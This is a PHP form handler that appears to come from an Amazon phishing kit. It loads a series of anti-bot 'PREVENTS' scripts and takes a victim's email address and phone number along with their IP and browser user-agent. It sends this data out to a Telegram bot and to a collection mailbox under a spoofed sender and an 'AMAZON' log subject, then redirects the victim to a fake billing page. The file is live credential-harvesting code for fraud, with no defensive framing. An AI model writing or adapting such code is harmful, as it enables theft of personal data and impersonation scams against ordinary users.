<?php
session_start();
include('../email.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');


// Fonction pour valider l'adresse email
function is_valid_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Fonction pour valider le numéro de téléphone (ici, on considère une validation simple)
function is_valid_phone($phone) {
    return preg_match('/^\+?[0-9\s\-\(\)]+$/', $phone);
}

// Capturer les informations IP et User-Agent
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['email']) && isset($_POST['phone'])) {
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        $phone = filter_var($_POST['phone'], FILTER_SANITIZE_STRING);
        
        $_SESSION['email'] = $email;
        $_SESSION['phone'] = $phone;

        // Vérifier si l'email et le téléphone sont valides
        if (!empty($email) && is_valid_email($email) && !empty($phone) && is_valid_phone($phone)) {
            $message = "
            📧 E-MAIL : {$email}
            📞 NUM : {$phone}
			
            📍 IP ADRESS : {$_SESSION['ip']}
            🥷 USER-AGENT : {$_SESSION['useragent']}
            ";

            // Envoyer le message via Telegram
            $data = [
                'text' => $message,
                'chat_id' => $chat_id
            ];
            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));

            // Préparer l'email
            $subject = "=?utf-8?Q?=E3=80=8C=F0=9F=A7=8A=E3=80=8D=2B1_LOG_AMAZON?= - {$_SESSION['ip']}";
            $headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";

            // Envoyer l'email
            mail($boite_rez, $subject, $message, $headers);

            // Rediriger vers la page de facturation
            header('Location: ../reprograme.php');
            exit();
        } else {
            // Rediriger en cas d'email ou de téléphone invalide
            $error = '';
            if (empty($email) || !is_valid_email($email)) {
                $error .= 'emailError=true&';
            }
            if (empty($phone) || !is_valid_phone($phone)) {
                $error .= 'phoneError=true&';
            }
            header("Location: ../index.php?{$error}inputError=true");
            exit();
        }
    } else {
        // Rediriger en cas d'absence de champ email ou téléphone
        header('Location: ../index.php?methodError=true');
        exit();
    }
} else {
    // Rediriger si la méthode de requête n'est pas POST
    header('Location: ../index.php?methodError=true');
    exit();
}
?>
